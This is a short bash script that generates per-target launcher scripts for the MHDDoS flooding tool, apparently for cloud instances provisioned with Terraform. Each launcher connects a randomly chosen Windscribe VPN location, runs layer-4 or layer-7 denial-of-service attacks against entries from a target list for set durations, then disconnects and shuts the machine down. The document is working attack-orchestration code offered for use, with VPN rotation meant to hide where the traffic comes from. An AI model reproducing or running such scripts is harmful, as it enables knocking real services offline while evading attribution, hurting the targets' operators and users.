#!/bin/bash
rm -rf go_*.sh

# Params
LAYER=$1
TARGETS=$2

VPNS=("Goodbye Lenin" "Hermitage" "Shnur" "Rakia")
MAX_INDEX=$(expr ${#VPNS[@]} - 1)
COUNTER=0

while IFS="" read -r TARGET || [ -n "${TARGET}" ]
do
    RAND=$(shuf -i 0-${MAX_INDEX} -n 1)
    VPN=${VPNS[${RAND}]}
    if [[ $LAYER -eq 4 ]]
        then
    # Template
cat << EOF > go_$COUNTER.sh
#!/bin/bash
exec 1> /home/ubuntu/from_terraform_with_love.log 2>&1
set -x

cd /home/ubuntu/MHDDoS
source venv/bin/activate

echo 'Starting'
windscribe connect "$VPN" # vpn name as param from list

python3 start.py $TARGET 256 3600 true # from list

windscribe disconnect
deactivate
echo 'Finished, shutting down...'

sudo shutdown
EOF
    fi
    if [[ $LAYER -eq 7 ]]
        then
# Template
cat << EOF > go_$COUNTER.sh
#!/bin/bash
exec 1> /home/ubuntu/from_terraform_with_love.log 2>&1
set -x

cd /home/ubuntu/MHDDoS
source venv/bin/activate

echo 'Starting'
windscribe connect "$VPN" # vpn name as param from list

python3 start.py $TARGET 5 256 "" 200 60 true # from list

windscribe disconnect
deactivate
echo 'Finished, shutting down...'

sudo shutdown
EOF
    fi
    let COUNTER=${COUNTER}+1
done < ${TARGETS}